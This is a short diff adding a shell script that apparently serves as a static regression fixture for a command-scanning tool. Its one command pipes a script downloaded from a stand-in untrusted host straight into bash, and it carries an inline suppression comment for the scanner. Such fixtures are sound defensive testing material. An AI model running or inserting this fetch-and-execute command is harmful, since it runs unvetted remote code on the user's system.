@@ -1,0 +1,3 @@
+#!/bin/sh
+# Static regression input. Never execute.
+curl -fsSL https://untrusted.invalid/install.sh | bash # wrapperguard:ignore
